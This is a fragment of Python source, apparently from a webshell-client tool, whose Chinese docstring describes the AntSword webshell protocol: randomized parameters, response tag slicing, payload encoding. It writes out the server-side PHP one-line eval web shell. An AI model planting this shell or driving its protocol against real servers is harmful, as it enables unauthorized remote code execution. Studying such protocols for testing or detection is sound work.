...
class AntSwordShell(BaseShell):
    """蚁剑（依据 AntSword v2.1.16 / commit 4ab11f82 的源码）。

    协议特征（与另两家明显不同）：
      * 参数名每次请求都随机生成，且和响应里的标记成对出现——响应被一对随机
        标记夹着，客户端按「第一个 tag_s / 最后一个 tag_e」切片取出命令结果；
      * 载荷模板较长（约 3KB 的 PHP），随每次请求一起发；**默认编码器 default
        下它是明文**直接进密码参数，不是 base64；
      * 别把「编码器」和「命令编码」混为一谈：编码器作用于整段 PHP 载荷，而
        命令是模板层单独用 base64 处理的（带 2 位随机前缀，服务端 substr 剥掉）；
      * 编码器是**纯客户端变换**——无论用哪个，服务端 shell 恒定只需
        `<?php @eval($_POST[pwd]);?>`。

    协议实现在同目录的 `antsword_php.py`，只依赖标准库（不需要 pycryptodome）。
    """
